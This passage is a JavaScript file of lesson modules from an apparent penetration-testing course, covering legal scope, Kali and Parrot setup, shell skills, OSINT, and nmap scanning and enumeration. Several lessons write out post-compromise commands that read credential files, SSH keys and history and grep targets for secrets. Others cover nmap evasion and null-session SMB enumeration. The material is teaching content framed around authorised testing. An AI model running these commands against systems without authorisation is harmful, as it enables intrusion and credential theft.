/* ==========================================================================
   ZothPen — curriculum: modules
   Lesson bodies use a tiny inline markdown (rendered by app.js `md()`):
     ```lang   code fence            # heading
     - bullet                         1. ordered
     > note   >! danger  >= info  >+ ok
     **bold**  `code`  [text](url)
   ========================================================================== */
window.ZM = [

/* ---------------------------------------------------------------- 00 ---- */
{
  id:'m00', n:'00', phase:'FOUNDATION', title:'Rules of Engagement & the Law',
  blurb:'Before you touch a port scanner: what you may legally test, how to get it in writing, and the habits that keep you out of prison.',
  why:'Every serious operator has this module memorised. Not because it is fun, but because the difference between a pentester and a criminal is a signed document and a scope — not skill, and not intent.',
  lessons:[
    { t:'Authorisation is the whole ballgame', body:`You do not have permission to test something because:
- it is "just a website anyone can reach"
- you found a vulnerability by accident
- you are "only looking, not exploiting"
- it belongs to your employer (unless a document says otherwise)

Accessing a computer you are not authorised to access is a crime in most jurisdictions. In the US it is the **Computer Fraud and Abuse Act (18 U.S.C. § 1030)**; in the UK the **Computer Misuse Act 1990**; the EU has the **Budapest Convention** plus national implementations. Penalties scale from fines to years, and "I was doing security research" is not a defence you can rely on.

\`\`\`text
CFAA §1030(a)(2)  obtaining information from a protected computer  -> up to 5 years
CFAA §1030(a)(4)  fraud + obtaining anything of value             -> up to 5 years
CFAA §1030(a)(5)  intentionally damaging a computer               -> up to 10 years
CMA 1990 s.1      unauthorised access                             -> up to 2 years
CMA 1990 s.3      unauthorised acts / impairment                  -> up to 10 years
\`\`\`

**The four words that save you: *written, scoped, signed, dated.***

>! Never accept verbal authorisation. Not from a manager, not from a friend who "owns the site", not from a CTF that has no rules page. If it is not written down and signed by someone with the authority to sign it, it is not authorisation.`},

    { t:'Anatomy of a scope document', body:`A real authorisation and scope document (often an SoW or RoE) contains, at minimum:

1. **Parties** — legal names, signatories, and their authority to authorise.
2. **In-scope assets** — exact IP ranges, CIDR blocks, domains, subdomains, cloud accounts, physical sites. \`10.10.10.0/24\` is a scope; \`*.example.com\` needs a subdomain list attached.
3. **Explicitly out of scope** — production databases, third-party SaaS, other tenants, employee personal devices. Listing exclusions is as important as listing inclusions.
4. **Window** — dates and hours. Testing a hospital at 03:00 on a Sunday is a different risk than at 09:00 on a Tuesday.
5. **Allowed techniques** — is social engineering in? Physical entry? Denial-of-service or stress testing? Credential stuffing? Usually the answers are no, no, no, no.
6. **Emergency contacts** — two phone numbers that answer, 24/7, for "your scan took a production service down".
7. **Data handling** — where loot, screenshots and hashes may be stored, retention, and destruction date.

\`\`\`bash
# Keep a per-engagement folder. Every command you run gets logged into it.
mkdir -p ~/engagements/ACME-2026-04/{recon,scans,loot,exploits,evidence,report}
# Log every shell session for the whole engagement:
script -a ~/engagements/ACME-2026-04/evidence/session-$(date +%F-%H%M).log
\`\`\`

>= Your shell history and your session logs are your defence if an incident is later blamed on you. Log from minute one, not after something breaks.`},

    { t:'Where you are allowed to practise', body:`You need targets you are *actually* allowed to break. These are the good ones:

| Platform | What it is | Cost | Best for |
|---|---|---|---|
| TryHackMe | guided, browser-based rooms + AttackBox | free tier | absolute beginners, learning the *why* |
| Hack The Box | unguided machines, Pro Labs for AD | free + paid | building real methodology |
| PortSwigger Web Security Academy | web vulns with theory + labs | free | web app depth, no comparison |
| VulnHub | downloadable VM images | free | offline practice, no VPN |
| PentesterLab | curated web/Unix exercises | paid | web exploitation fundamentals |
| OffSec PG / Proving Grounds | exam-like machines | paid | OSCP prep |
| Your own VMs | Metasploitable2, DVWA, Juice Shop, AD-lab | free | full control, zero legal risk |

\`\`\`bash
# Snapshot before you break. Always. This one habit doubles your lab speed.
# VirtualBox
VBoxManage snapshot "kali" take "clean-post-tools" --description "post-setup baseline"
VBoxManage snapshot "kali" restore "clean-post-tools"
# VMware / QEMU equivalent:
#   vmrun snapshot kali.vmx clean   |   qemu-img snapshot -c clean kali.qcow2
\`\`\`

>! Test against infrastructure you own or that explicitly invites testing. A CTF machine you downloaded is fine. A random IP from Shodan is not, however tempting the banner looks.`}
  ],
  keyIdeas:[
    'Written, scoped, signed, dated — or it is not authorisation.',
    'Log everything from minute one; session logs are your alibi and your report source.',
    'Snapshot your VMs before and after every lab. Rebuild speed is a skill multiplier.',
    'Practise on platforms that invite it: THM, HTB, PortSwigger, VulnHub, your own VMs.'
  ],
  tools:['t-legal','t-shodan'],
  labs:['lab-setup', 'lab-shell'],
  xp:60
},

/* ---------------------------------------------------------------- 01 ---- */
{
  id:'m01', n:'01', phase:'FOUNDATION', title:'Build the Arsenal: ZothPen, Kali & Parrot',
  blurb:'Operate across ZothPen (Amnesic Live ISO), ZothPen-Lite (browser workstation), Kali Linux, Parrot OS, or any Linux host. Metapackages, Tor routing, snapshots, and zero-trace workflows.',
  why:'Your OS is the tool that runs all the other tools. Operators who know how to move seamlessly between ZothPen / ZothPen-Lite, Kali, Parrot, and standard POSIX Linux work twice as fast, recover from broken installs in minutes, and never lose an engagement because a dependency broke mid-scan.',
  lessons:[
    { t:'ZothPen, ZothPen-Lite, Kali & Parrot — the honest comparison', body:`Every command in this manual works on any POSIX Linux workstation. Whether you boot **ZothPen** (Amnesic Live ISO), launch **ZothPen-Lite** (\`zothos.nullai.tech\`) in a browser, or run **Kali Linux** / **Parrot OS** in a VM, choose on operational requirements:

\`\`\`text
                  ZOTHPEN LIVE ISO              ZOTHPEN-LITE (WEB OS)         KALI LINUX / PARROT OS
base              Debian Bookworm Live (toram) Browser WebOS / WASM / MCP   Debian testing / rolling
persistence       Amnesic RAM-only (zero disk) Local IndexedDB + Vaelor     Persistent VM disk + snapshots
anonymity / opsec nftables zoth-tor-switch     Zero-egress local sandbox    Kali: manual | Parrot: AnonSurf
cognitive tooling Chain of Thoughts + Vaelor   Pentesting Dojo + CoT + 3D   600-800 packaged CLI/GUI tools
best for          Airgapped / zero-trace ops   Instant drills, CoT & Dojo   Full heavy-duty VM lab ranges
\`\`\`

Practical decision rule:

- **Zero-trace hardware boot, RAM-only \`toram\` execution, or strict nftables Tor kill-switch** → **ZothPen Live ISO** (\`zoth-tor-switch\`, local Vaelor AES-256-GCM vault, zero NVMe forensic residue on power-off).
- **Instant zero-install browser practice, Pentesting Dojo missions, Chain of Thoughts DAG hypothesis branching, and 3D Engram memory** → **ZothPen-Lite** (\`https://zothos.nullai.tech\`).
- **Heavy VM lab ranges, Active Directory Pro Labs, and exam environments** → **Kali Linux** or **Parrot OS** (or any Ubuntu/Debian/Arch host with Docker + \`nmap\`, \`netexec\`, \`ffuf\`, and \`impacket\`).
- **Serious answer:** use **ZothPen-Lite** to drill commands and map your **Chain of Thoughts** attack trees anywhere, keep a **Kali/Parrot VM** with clean snapshots for multi-host target ranges, and boot **ZothPen Live ISO** when you require amnesic RAM-only opsec.

>= If your hardware is weak, ZothPen-Lite runs in any modern browser with zero VM overhead, while Kali/Parrot headless installs and ZothPen XFCE run smoothly in 4 GB RAM.`},

    { t:'Install, update, and stay updated', body:`Grab the ISO from the official source only (kali.org/get-kali or parrotsec.org/download) and verify the checksum. A tampered installer is a compromised engagement before it starts.

\`\`\`bash
# --- verify what you downloaded (GPG-signed sums) ---
wget https://cdimage.kali.org/current/SHA256SUMS
wget https://cdimage.kali.org/current/SHA256SUMS.gpg
gpg --verify SHA256SUMS.gpg SHA256SUMS
sha256sum kali-linux-2025.4-installer-amd64.iso   # compare to the file
\`\`\`

\`\`\`bash
# --- first boot: update, then upgrade ---
sudo apt update && sudo apt full-upgrade -y     # Kali: full-upgrade, not upgrade
grep VERSION /etc/os-release                    # confirm you are on the build you think
uname -r                                        # kernel

# --- Parrot uses its own wrapper for the same job ---
sudo parrot-upgrade                             # updates + upgrade in one, parrot-specific
\`\`\`

**Metapackages** are how you control which tool groups are installed. Nobody needs all 600 tools on disk.

\`\`\`bash
kali-tweaks                      # TUI: Metapackages | Shell | APT mirrors | Hardening | Virtualization
# or explicitly:
sudo apt install -y kali-linux-headless        # no GUI: servers, VPS, docker images
sudo apt install -y kali-linux-default         # the standard desktop set
sudo apt install -y kali-linux-large           # + the big tools
sudo apt install -y kali-tools-web             # web app tools only
sudo apt install -y kali-tools-windows-resources   # impacket, nxc, evil-winrm style tooling
sudo apt install -y kali-tools-wireless        # 802.11, bluetooth, RF
sudo apt install -y kali-tools-forensics kali-tools-reverse-engineering
\`\`\`

\`\`\`bash
# --- the bootstrapper: when you want tools, not a distro ---
sudo apt install -y katoolin3 2>/dev/null   # third-party repo importer (use with care)
\`\`\`

>= \`kali-tweaks\` is the single most under-used command on Kali. Shell config, APT mirrors (pick a faster one), hardening, VM guest tools — one TUI.`},

    { t:'ZothPen & Parrot specifics: zoth-tor-switch, toram, and anonsurf', body:`Both **ZothPen** and **Parrot OS** treat network isolation and forensic hygiene as first-class primitives rather than afterthoughts.

\`\`\`bash
# --- ZothPen Live ISO: Amnesic RAM boot & nftables Tor kill-switch ---
# At GRUB boot menu: select "ZothPen Live (Amnesic toram)" -> copies SquashFS into RAM
grep -o 'toram' /proc/cmdline                   # confirm physical USB/NVMe is unmounted
sudo zoth-tor-switch start                      # lock egress to Tor via nftables (blocks raw UDP leaks)
sudo zoth-tor-switch status                     # verify transparent proxy & DNS port 9053
sudo zoth-tor-switch stop                       # restore direct interface routing for local LAN scans

# --- ZothPen-Lite (zothos.nullai.tech): Browser Dojo + Chain of Thoughts + Vaelor ---
# 1. Open Terminal / Pentesting Dojo -> run guided recon, SQLi, privesc & crypto missions
# 2. Open Chain of Thoughts Studio -> log observations & branch attack hypotheses (DAG)
# 3. Open Vaelor Zero-Knowledge Vault -> seal sensitive loot with Argon2id + AES-256-GCM

# --- Parrot OS: AnonSurf 6 routes supported system traffic through Tor ---
sudo apt install anonsurf-cli anonsurf-gui
anonsurf start        # begin routing through Tor
anonsurf status       # check state
anonsurf myip         # confirm your egress IP changed (the only honest test)
anonsurf stop         # back to normal networking
\`\`\`

>! Transparent Tor routing (\`zoth-tor-switch\` or \`anonsurf\`) is for passive OSINT and egress privacy. Do **not** leave it enabled when running high-rate SYN scans (\`nmap -sS\`) or UDP probes against an internal lab range — Tor is TCP-only and high-rate scanning over circuits will stall your tools. For internal lab ranges (\`192.168.56.0/24\`), use direct host-only networking.

Other Parrot and multi-distro conveniences worth knowing:

\`\`\`bash
sudo apt install parrot-tools-full     # Parrot "everything" metapackage
parrot-upgrade                         # Parrot update wrapper
# On standard Ubuntu / Debian / Arch: run offensive suites cleanly in Docker or Podman
docker run --rm -it --net=host kalilinux/kali-rolling bash
\`\`\`

**Editions:** Whether you run **ZothPen Live ISO**, **ZothPen-Lite**, **Kali**, **Parrot Security**, or a minimal **Debian/Arch** host with custom scripts, treat your offensive environment as disposable and reproducible.`},

    { t:'Organise the workstation like a professional', body:`A new install is a blank, ugly, unbranded tool. Ten minutes of structuring pays back for years.

\`\`\`bash
# --- the operator's directory tree ---
mkdir -p ~/{tools,wordlists,engagements,scripts,templates,notes}
mkdir -p ~/engagements/{_template/{recon,scans,loot,evidence,report}}

cat > ~/engagements/_template/scope.txt <<'EOF'
# Engagement: <CLIENT> <DATE>
# In scope:
# Out of scope:
# Window:
# Emergency contact:
EOF

# --- real, big wordlists (don't fight the defaults, but know where they are) ---
ls /usr/share/wordlists/                     # Kali: rockyou.txt.gz + dirb/ + wfuzz/
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
wordlists -h 2>/dev/null | head -20          # Kali helper for common wordlists
# Optional extra sets (kali-tweaks -> Kali metapackages, or manual):
#   SecLists        /usr/share/seclists
#   Assetnote/commonspeak2, payloadsallthethings, fuzzdb
\`\`\`

**Snapshot, then snapshot again.** A broken Kali mid-engagement is a nightmare; with a snapshot it is a 40-second rollback.

\`\`\`bash
VBoxManage snapshot "kali" take "clean-post-tools"
# do work, break things, then:
VBoxManage snapshot "kali" restore "clean-post-tools"
\`\`\`

**Keep your tooling in version control.** Your custom scripts, wordlists of choice, tmux config and aliases should live in git, not in one VM that will inevitably die.

\`\`\`bash
cd ~/scripts && git init && git add -A && git commit -m "arsenal baseline"
git remote add origin git@github.com:you/dotfiles.git && git push -u origin main
\`\`\`

>= Rebuild drill: once a month, wipe a VM, install Kali from ISO, restore your dotfiles repo, verify every core tool works. Your rebuild time is a direct measure of how well-organised your setup really is. Target: under 30 minutes.`}
  ],
  keyIdeas:[
    'Every workflow runs across ZothPen (Amnesic Live ISO), ZothPen-Lite (zothos.nullai.tech), Kali, Parrot, or any Linux OS.',
    'Metapackages + kali-tweaks = control the install instead of letting it control you.',
    'zoth-tor-switch and AnonSurf route TCP/DNS traffic for OSINT; disable them before high-rate local lab scans.',
    'Snapshot before work, use /dev/shm or toram for volatile scratch, and seal loot in Vaelor Vault.',
    'Verify ISO checksums and GPG signatures. Always.'
  ],
  tools:['t-zothpen','t-cot','t-kalitweaks','t-anonsurf','t-git','t-tmux'],
  labs:['lab-setup','lab-zothpen-op'],
  xp:100
},

/* ---------------------------------------------------------------- 02 ---- */
{
  id:'m02', n:'02', phase:'FOUNDATION', title:'Linux & the Shell for Operators',
  blurb:'The six commands you use ten thousand times, pipes and redirection, text-mangling that turns raw scanner output into a target list, and the file system layout that hides the loot.',
  why:'Every tool on Kali is a shell command, and every tool\'s output wants to become someone else\'s input. Fluency here is the difference between running tools and building workflows. This module is the single highest-leverage skill in the whole manual.',
  lessons:[
    { t:'Navigation, permissions, and reading the system', body:`\`\`\`bash
pwd; ls -la; cd /var/www/html; cd -           # where am I, what's here, go back
find / -perm -4000 -type f 2>/dev/null        # SUID binaries: classic privesc lead
find / -writable -type d 2>/dev/null          # world-writable dirs
ls -l /etc/passwd /etc/shadow                 # who can read the credential stores
id; whoami; groups; sudo -l                   # identity and privileges, always first
cat /etc/os-release; uname -a                 # what is this box, exactly
ss -tulpn                                     # listening sockets + owning process
ps auxf; ps -eo pid,user,args --sort=-%mem | head -20
\`\`\`

Read permissions as **rwx for user, group, other**:

\`\`\`text
-rwsr-xr-x 1 root root  root-owned, SUID set (s), everyone can run it as root
       ^ rwxrwsr-x  group SUID/SGID variant
drwx------ = a directory only the owner may enter   (0700)
\`\`\`

\`\`\`bash
# Octal mode maths you will use constantly
chmod 644 file      # rw-r--r--    default for files
chmod 755 dir       # rwxr-xr-x    default for directories and scripts
chmod 600 id_rsa    # rw-------    private keys: anything else and ssh refuses
chmod +x script.sh  # add execute
umask               # what new files get stripped to
\`\`\`

>! Never \`chmod -R 777\` anything. It is the single clearest sign that someone does not understand permissions, it breaks SSH key checks, and on a real engagement it is an incident waiting to be written up.`},

    { t:'Pipes, redirection, and building target lists', body:`The Unix philosophy: small tools, chained. You will use this **every single engagement**, so learn it properly.

\`\`\`bash
# --- redirection ---
cmd > out.txt        # stdout to file (truncate)
cmd >> out.txt       # append
cmd 2> err.txt       # stderr only
cmd &> all.txt       # stdout + stderr  (bash)
cmd 2>/dev/null      # throw errors away, keep clean output
cmd | tee out.txt    # show AND save - use this constantly on scans

# --- the pipeline that matters ---
nmap -sV -p- -oG scan.gnmap 10.10.10.0/24
grep 'Ports:' scan.gnmap | cut -d' ' -f2 | sort -u > hosts.txt      # live hosts
grep -Eo '[0-9]+/open/tcp//[a-z-]+' scan.gnmap | sort -u > ports.txt # open ports+svc

# --- turn any text into a clean target/cred list ---
grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}' raw.txt | sort -u > ips.txt
awk -F: '{print $1":"$2}' creds.txt | sort -u > userpass.txt
sed 's/^[0-9]*\\s*//' hosts.txt | tr '[:upper:]' '[:lower:]' | sort -u
\`\`\`

The text toolkit, in order of how often you will reach for it:

\`\`\`bash
grep -Ei 'password|secret|token' -r . --include='*.conf'   # find needles
awk '{print $1}'        # column 1        awk -F: '{print $NF}'  # last field
cut -d: -f1             # field 1, colon-delimited
sed -n '10,20p' f.txt   # lines 10-20     sed 's/old/new/g'      # replace
sort -u | uniq -c | sort -rn            # unique + frequency, most common first
tr -d '\\r'              # strip CRLF from Windows files (happens constantly)
xargs -I{} -P10 cmd {}  # run cmd on each line, 10 in parallel
tee, head, tail -f, wc -l, tr, rev, jq (JSON), yq (YAML), xxd (hex)
\`\`\`

>= \`tee\` is the operator's best habit: every scan you run should both show you output now and leave a file for the report later. Aliases in module 14 automate this.`},

    { t:'The file system map worth memorising', body:`Where things hide, on a Linux target you have just landed on.

\`\`\`text
/etc/passwd          users (world readable)      /etc/shadow   hashes (root only)
/etc/hosts           local DNS overrides         /etc/crontab  scheduled jobs = privesc
/etc/ssh/sshd_config password auth? root login?  ~/.ssh/       keys -> ssh -i id_rsa user@host
/var/www/html        webroot                     /var/log/     auth.log, syslog, apache2/
/opt  /srv           third-party apps, often poorly permissioned
/tmp  /dev/shm       world-writable, noexec status varies -> payload parking
/proc/self/environ   env vars of your process     /proc/*/cmdline  what other processes run
~/.bash_history      what the admin typed before you
~/.config, ~/.local  app configs, saved creds, tokens
\`\`\`

\`\`\`bash
# The 60-second triage on any new Linux shell
id; sudo -l; cat /etc/os-release; uname -a
cat ~/.bash_history; ls -la ~/.ssh/ 2>/dev/null
ss -tulpn | grep LISTEN
find / -perm -4000 -type f 2>/dev/null
crontab -l 2>/dev/null; ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null
grep -rE 'password|passwd|secret' /home /var/www /opt 2>/dev/null | head -40
\`\`\`

**Environment variables leak a lot.** On a shell, \`env\` frequently exposes proxy credentials, API keys, and internal hostnames — from the shell you got, not from the target's config.

>+ Build this triage as a script in module 14 and keep it on your dotfiles repo. Typing 8 commands from memory at 2 a.m. is how steps get forgotten and reports get holes.`},

    { t:'tmux: never lose a session again', body:`SSH dies. Terminals close. A 40-minute scan vanishes. tmux is not optional for anyone who works over a shell.

\`\`\`bash
sudo apt install -y tmux
tmux new -s acme            # named session -> survives disconnect
# detach:  Ctrl-b d      reattach:  tmux attach -t acme      list:  tmux ls
# inside:  Ctrl-b c new window   Ctrl-b n/p next/prev   Ctrl-b % split vertical
#          Ctrl-b " split horizontal   Ctrl-b arrow move   Ctrl-b z zoom pane
\`\`\`

A minimal \`~/.tmux.conf\` that makes it usable (drop into module 14's dotfiles):

\`\`\`bash
set -g prefix C-a                 # Ctrl-a is easier than Ctrl-b
bind C-a send-prefix
set -g mouse on
set -g history-limit 50000
setw -g mode-keys vi
bind | split-window -h -c "#{pane_current_path}"
bind - split-window -v -c "#{pane_current_path}"
bind r source-file ~/.tmux.conf \\; display "reloaded"
set -g status-bg black
set -g status-fg green
set -g status-left "  #S "
set -g status-right " %Y-%m-%d %H:%M "
\`\`\`

\`\`\`bash
# The engagement layout you will re-create a hundred times (scripted in module 14)
tmux new -s acme -d
tmux rename-window -t acme:0 'recon'
tmux new-window  -t acme -n 'scan'
tmux new-window  -t acme -n 'shell'
tmux new-window  -t acme -n 'note'
tmux attach -t acme
\`\`\`

>= \`script -a log.txt\` inside any pane gives you a full transcript for the report. Combined with tmux, nothing you did is ever lost.`}
  ],
  keyIdeas:[
    'id, whoami, sudo -l, ss -tulpn, and the SUID/cron checks are the first 60 seconds on any host.',
    'Pipes + grep/awk/sed/tee turn noise into a target list and a report appendix.',
    'Know the file system map — permissions, cron, SSH keys and webroots hide the path forward.',
    'tmux sessions survive dropped connections; script(1) logs give you evidence.',
    'Never chmod 777 anything, ever.'
  ],
  tools:['t-bash','t-tmux','t-grep','t-nc'],
  labs:['lab-shell'],
  xp:120
},

/* ---------------------------------------------------------------- 03 ---- */
{
  id:'m03', n:'03', phase:'RECON', title:'Reconnaissance & OSINT',
  blurb:'Find the attack surface before you touch it: subdomains, email addresses, leaked credentials, exposed services, and the digital footprint the target forgot about.',
  why:'The best pentesters spend more time here than anywhere else, because everything afterwards is easier when you know what exists. A missed subdomain can be the whole engagement; a wrong scope line can be a lawsuit.',
  lessons:[
    { t:'Passive first: the target never sees you', body:`Passive recon means querying third parties, not the target. No packets hit their infrastructure, so it cannot be logged as an attack and it is always in scope.

\`\`\`bash
# --- DNS: who owns what ---
whois example.com
dig +short A example.com; dig +short MX example.com; dig +short TXT example.com
dig +short NS example.com
dig TXT _dmarc.example.com                      # email posture
host -t axfr @ns1.example.com example.com       # zone transfer: rare, glorious when it works
# subdomain wordlist brute force (noisy - DNS queries, but via public resolvers)
dnsrecon -d example.com -t std,brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# --- modern, fast, from ProjectDiscovery ---
subfinder -d example.com -all -silent > subs.txt       # passive subdomain enumeration
amass enum -passive -d example.com -o amass.txt         # multi-source graph
httpx -l subs.txt -silent -title -tech-detect -status-code   # which ones are alive?
\`\`\`

\`\`\`bash
# --- OSINT: people, emails, leaks ---
theHarvester -d example.com -b duckduckgo,bing,crtsh,otx -l 500
# Leaked-credential hunting (defensive value: proves password reuse risk)
#   HaveIBeenPwned domain search, DeHashed, IntelX, LeakCheck  -> API keys required
# GitHub dorking (grey: public data, but check the scope doc)
#   "example.com" password        github.com/search?q=...&type=code
\`\`\`

**Certificate transparency is free real estate.** Every TLS cert ever issued is public and logged:

\`\`\`bash
curl -s 'https://crt.sh/?q=%25.example.com&output=json' \\
  | jq -r '.[].name_value' | sed 's/\\*\\.//' | sort -u > ct-subs.txt
\`\`\`

>= Passive recon output belongs in the report. "We found 412 subdomains you did not know about, 9 of them unauthenticated" is often the highest-value finding of an engagement, and it cost zero risk.`},

    { t:'Active recon: Google dorks, DNS, and Shodan', body:`Once you have authorisation for a range, you may query it directly. Until then, anything you query directly is out of bounds — including "just a quick ping".

\`\`\`bash
# --- Google / Bing dorks (search engines, not the target) ---
site:example.com -www                      # non-www hosts
site:example.com filetype:pdf              # documents
site:example.com intitle:"index of"        # directory listings
site:example.com inurl:admin OR inurl:login
site:pastebin.com "example.com"            # pasted configs
"example.com" ext:sql OR ext:env OR ext:log
\`\`\`

\`\`\`bash
# --- Shodan: the search engine for exposed services ---
# CLI setup: shodan init <API_KEY>   (key from shodan.io -> account)
shodan host 198.51.100.10
shodan search 'org:"Example Corp" port:3389'
shodan search 'ssl:"example.com" -port:443'
shodan stats --facets country:5 org:"Example Corp"
\`\`\`

\`\`\`python
#!/usr/bin/env python3
# Map a company's exposed surface. Offline-safe pattern; needs SHODAN_API_KEY in env.
import os, shodan
api = shodan.Shodan(os.environ["SHODAN_API_KEY"])
for q in ['org:"Example Corp"', 'ssl:"example.com"']:
    try:
        for r in api.search(q, limit=100)['matches']:
            print(f"{r['ip_str']:15} {r.get('port','')}/tcp  {r.get('product','?')}  {r.get('hostnames',[])}")
    except shodan.APIError as e:
        print("api error:", e)     # free keys are rate limited and lack some filters
\`\`\`

>! \`shodan search\` counts against your query credits. \`shodan host\` is cheaper than broad searches, and \`--facets\` answers "how big is this surface" in one query instead of fifty. Cache every result to disk before you iterate on a query.

>= Also useful: Censys, FOFA, ZoomEye, Netlas, and GreyNoise (which tells you which IPs are scanning *you*, and whether a given IP is known-malicious).`},

    { t:'Turn recon into a plan', body:`Recon ends with an artefact, not a feeling. Before you scan anything, you should have:

1. **A scope-verified asset list** — every host you intend to touch, cross-checked against the signed scope. Anything not on the list gets removed, not "tested carefully".
2. **A priority ranking** — which hosts look most promising and why (login pages, old TLS, exposed admin panels, forgotten dev environments, misconfigured cloud storage).
3. **A hypothesis for each entry point** — "this PHP app has a \`?id=\` parameter" or "this host advertises SMBv1" tells you which tool to reach for.
4. **A log of what you did** — commands, timestamps, output files.

\`\`\`bash
# The recon notes file that becomes the report skeleton
cat > ~/engagements/ACME-2026-04/recon/notes.md <<'EOF'
# ACME recon 2026-04-12
## Scope verified against SoW §2: 10.10.10.0/24, *.acme.example
## Assets
- 10.10.10.5   lab-web01   Apache 2.4.52, PHP        --> test ?id= params first
- 10.10.10.10  lab-dc01    Win DC, zoth.local         --> AD path, SMB signing off?
- 10.10.10.20  lab-win02   Windows 10, SMB 445 open   --> relay candidate
## Excluded (not in scope)
- 10.10.10.99  third-party appliance - asked client, awaiting answer
## Next actions
1. nmap -sV -sC -oA recon/full on 6 hosts
2. nxc smb subnet --shares for anonymous access
EOF
\`\`\`

**A note on the ethics of information you find by accident.** If recon surfaces something outside scope — a third party's data, an unrelated victim's credentials — the correct action is to stop, document it, and tell the client contact. Do not "have a quick look". That single moment separates professionals from the people who end up in court.

>= The recon notes file is also your engagement diary. When the client asks "what did you do at 14:20 on Tuesday", you have the answer in one file instead of in your memory.`}
  ],
  keyIdeas:[
    'Passive recon touches third parties, not the target — always in scope, always free.',
    'Certificate transparency and Shodan are the two highest-yield free OSINT sources.',
    'Active recon requires authorisation; "just a quick ping" is still unauthorised access.',
    'Recon ends with a scope-verified, prioritised asset list and a hypotheses file.',
    'Out-of-scope discovery: stop, document, report. Never peek.'
  ],
  tools:['t-subfinder','t-httpx','t-amass','t-theharvester','t-shodan','t-dnsrecon'],
  labs:['lab-recon'],
  xp:140
},

/* ---------------------------------------------------------------- 04 ---- */
{
  id:'m04', n:'04', phase:'RECON', title:'Network Scanning & Enumeration',
  blurb:'Nmap properly — host discovery, service/version detection, NSE scripts, output formats and timing. Then the enumeration that turns "port 445 open" into credentials.',
  why:'Scanning is where most engagements are won or lost. Not because scanning is hard, but because the discipline of *enumerating what you found* is what other people skip. Ports are not findings; services, versions, and misconfigurations are.',
  lessons:[
    { t:'Nmap: the flags that actually matter', body:`Nmap is a language. Learn these twenty flags and you will never need to look up another scan type.

\`\`\`bash
# --- host discovery ---
nmap -sn 10.10.10.0/24                 # ping sweep, no port scan (who is alive)
nmap -Pn 10.10.10.5                    # skip discovery: treat host as up (firewall-friendly)
nmap -PS80,443 -PA80 10.10.10.5        # TCP SYN/ACK ping on specific ports

# --- port selection ---
nmap -p 22,80,443 10.10.10.5           # explicit
nmap -p- 10.10.10.5                    # all 65535 TCP ports (slow but complete)
nmap -p- --min-rate 2000 10.10.10.5    # fast, noisy: fine in a lab, rude on prod
nmap --top-ports 1000 10.10.10.5       # the common 1000
nmap -sU --top-ports 100 10.10.10.5    # UDP (slow: needs root, patience)

# --- detection ---
nmap -sS 10.10.10.5                    # SYN (half-open) scan, needs root, default, stealthier
nmap -sT 10.10.10.5                    # full TCP connect (no root needed)
nmap -sV --version-intensity 7         # service/version detection
nmap -sC 10.10.10.5                    # default NSE scripts
nmap -O 10.10.10.5                     # OS fingerprint (needs root, needs open+closed port)
nmap -A 10.10.10.5                     # -sV -sC -O -traceroute all at once

# --- timing & evasion ---
nmap -T4 10.10.10.5                    # timing template 0-5 (T4 = aggressive, lab default)
nmap -f --mtu 24 10.10.10.5            # fragment packets
nmap -D RND:10 10.10.10.5              # decoys (5+ better)
nmap --source-port 53 10.10.10.5       # spoof source port (bypasses lame ACLs)
nmap -sI zombie 10.10.10.5             # idle scan - the genuinely stealthy one
\`\`\`

**Always save output in all three formats.** You will regret it otherwise:

\`\`\`bash
nmap -sV -sC -p- -oA recon/lab-web01 -v 10.10.10.5
#   .nmap = human readable    .gnmap = greppable    .xml = parsable by every tool
\`\`\`

\`\`\`bash
# Read your own scans back without re-scanning (fast, no noise on target)
nmap --script smb-vuln-ms17-010 -p445 10.10.10.5     # NSE: check for known CVEs
nmap --script vuln -p 80,443 10.10.10.5              # broad vuln category
ls /usr/share/nmap/scripts/ | grep -c '\.nse$'       # ~600 scripts ship with Kali
grep -l 'smb' /usr/share/nmap/scripts/*.nse
nmap --script-help smb-enum-shares                   # read the docs before running
\`\`\`

>! \`-sV -sC -p-\` against a production range at T4 will trip IDS, may knock over fragile services, and on a big range takes hours. In a lab: go wild. In production: agree the timing with the client in writing, start with \`--top-ports\`, and use \`--min-rate\` rather than \`-T5\`.`},

    { t:'Scanning alternatives and masscan', body:`Nmap is the scalpel; sometimes you need a shotgun, and sometimes you need something quieter.

\`\`\`bash
# --- masscan: internet-scale, extremely fast, extremely noisy ---
sudo masscan -p1-65535 10.10.10.0/24 --rate 1000 -oL masscan.lst
sudo masscan -p80,443,8080 10.10.10.0/24 --rate 5000 --banners
# Then hand the open ports to nmap for real service detection:
grep -oE '[0-9]+/open' masscan.lst | cut -d/ -f1 | paste -sd, | \\
  xargs -I{} nmap -sV -sC -p{} -oA recon/detail 10.10.10.5
\`\`\`

\`\`\`bash
# --- rustscan: nice ergonomics, hands off to nmap automatically ---
rustscan -a 10.10.10.0/24 --ulimit 5000 -- -sV -sC
\`\`\`

\`\`\`bash
# --- UDP and service-specific probing ---
nmap -sU -p 53,67,69,123,161,500,1900 10.10.10.5
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.5
snmpwalk -v2c -c public 10.10.10.5            # the classic; try 'public' then 'private'
\`\`\`

| Situation | Tool | Why |
|---|---|---|
| unknown network, want live hosts fast | \`nmap -sn\` | cheap, reliable |
| huge range, need open ports now | \`masscan --rate\` | orders of magnitude faster |
| need to stay quiet | \`nmap -sI\` idle scan, or passive capture | no packets from your IP |
| need service/version + scripts | \`nmap -sV -sC\` | deepest per-host detail |
| periodic monitoring | \`nmap --compare\` / \`ndiff\` | diff two scans over time |

\`\`\`bash
# Scan diffing: prove what changed since last month
ndiff scans/week1.xml scans/week2.xml | head -40
nmap --compare scans/week1.xml scans/week2.xml
\`\`\`

>= Always confirm *why* a new port matters before you spend an hour on it. A newly opened 8080 on a public host is a finding; a closed 3306 that reappeared is a change worth reporting.`},

    { t:'Enumeration: the part that earns the money', body:`Scanning tells you a port is open. Enumeration tells you what it does, what it exposes, and where the credentials are. Do this religiously, service by service.

\`\`\`bash
# --- SMB / NetBIOS (Windows networks live here) ---
enum4linux -a 10.10.10.5                     # the classic all-in-one
enum4linux-ng -A 10.10.10.5 -oJ shares.json  # modern rewrite, JSON output
nxc smb 10.10.10.5 -u '' -p '' --shares      # null session share listing
nxc smb 10.10.10.5 -u 'guest' -p '' --shares --users --groups
smbclient -L //10.10.10.5/ -N                 # list shares anonymously
smbclient //10.10.10.5/backup -N              # mount a share, then: ls, get file, mget *
